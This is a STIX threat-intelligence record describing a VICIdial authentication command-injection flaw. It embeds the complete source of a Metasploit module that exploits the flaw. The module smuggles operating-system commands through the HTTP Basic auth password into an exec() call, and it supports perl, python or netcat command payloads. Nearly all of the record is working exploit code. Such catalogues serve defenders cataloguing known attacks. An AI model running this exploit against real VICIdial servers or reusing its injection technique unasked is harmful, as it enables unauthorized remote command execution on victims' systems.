{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--26b10a36-df95-4dbf-b3bc-0d926e82bb27",
    "created": "2024-08-14T17:12:01.269341Z",
    "modified": "2024-08-14T17:12:01.269345Z",
    "name": "VICIdial user_authorization Unauthenticated Command Execution",
    "description": " This module exploits a vulnerability in VICIdial versions 2.9 RC 1 to 2.13 RC1 which allows unauthenticated users to execute arbitrary operating system commands as the web server user if password encryption is enabled (disabled by default).  When password encryption is enabled the user's password supplied using HTTP basic authentication is used in a call to exec().  This module has been tested successfully on version 2.11 RC2 and 2.13 RC1 on CentOS.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/vicidial_user_authorization_unauth_cmd_exec.rb",
            "external_id": "vicidial_user_authorization_unauth_cmd_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.vicidial.org/VICIDIALmantis/view.php?id=1016"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'VICIdial user_authorization Unauthenticated Command Execution',\n      'Description'    => %q{\n        This module exploits a vulnerability in VICIdial versions\n        2.9 RC 1 to 2.13 RC1 which allows unauthenticated users\n        to execute arbitrary operating system commands as the web\n        server user if password encryption is enabled (disabled\n        by default).\n\n        When password encryption is enabled the user's password\n        supplied using HTTP basic authentication is used in a call\n        to exec().\n\n        This module has been tested successfully on version 2.11 RC2\n        and 2.13 RC1 on CentOS.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => 'bcoles',\n      'References'     =>\n        [\n          ['URL', 'http://www.vicidial.org/VICIDIALmantis/view.php?id=1016']\n        ],\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          # HTTP Basic authentication password\n          'Space' => 2048,\n          # apostrophe ('), quote (\"), semi-colon (;) and backslash (\\)\n          # are removed by preg_replace\n          'BadChars' => \"\\x00\\x0A\\x22\\x27\\x3B\\x5C\",\n          'DisableNops' => true,\n          'Compat' =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl python netcat'\n            }\n        },\n      'Targets'        => [[ 'Automatic Targeting', {} ]],\n      'Privileged'     => false,\n      'DisclosureDate' => '2017-05-26',\n      'DefaultTarget'  => 0))\n    register_options([ OptString.new('TARGETURI', [true, 'The base path to VICIdial', '/vicidial/']) ])\n    deregister_options('USERNAME', 'PASSWORD')\n  end\n\n  def check\n    user = rand_text_alpha(rand(10) + 5)\n    pass = \"#{rand_text_alpha(rand(10) + 5)}&#\"\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'vicidial_sales_viewer.php'),\n                           'authorization' => basic_auth(user, pass)\n\n    unless res\n      vprint_status 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    if res.code != 401\n      vprint_status \"#{peer} Unexpected reply. Expected authentication failure.\"\n      return CheckCode::Safe\n    end\n\n    # Check for input filtering of '#' and '&' characters in password\n    # Response for invalid credentials is in the form of: |<username>|<password>|BAD|\n    if res.body !~ /\\|#{user}\\|#{pass}\\|BAD\\|/\n      vprint_status \"#{peer} Target is patched.\"\n      return CheckCode::Safe\n    end\n\n    # Check for ../agc/bp.pl password encryption script\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, '..', 'agc', 'bp.pl')\n    if res && res.code == 200 && res.body =~ /Bcrypt password hashing script/\n      vprint_status \"#{peer} Password encryption is supported, but may not be enabled.\"\n      return CheckCode::Appears\n    end\n\n    vprint_status \"#{peer} Could not verify whether password encryption is supported.\"\n    CheckCode::Detected\n  end\n\n  def execute_command(cmd, opts = {})\n    user = rand_text_alpha(rand(10) + 5)\n    pass = \"#{rand_text_alpha(rand(10) + 5)}& #{cmd} #\"\n\n    print_status \"#{peer} Sending payload (#{cmd.length} bytes)\"\n    res = send_request_cgi 'uri' => normalize_uri(target_uri.path, 'vicidial_sales_viewer.php'),\n                           'authorization' => basic_auth(user, pass)\n\n    if !res\n      fail_with(Failure::Unreachable, 'Connection failed')\n    elsif res.code == 401 && res.body =~ /#{user}/ && res.body =~ /BAD/\n      print_good \"#{peer} Payload sent successfully\"\n    else\n      fail_with(Failure::UnexpectedReply, 'Unexpected reply')\n    end\n  end\n\n  def exploit\n    execute_command(payload.encoded)\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-05-26",
    "x_mitre_platforms": [
        "unix'"
    ]
}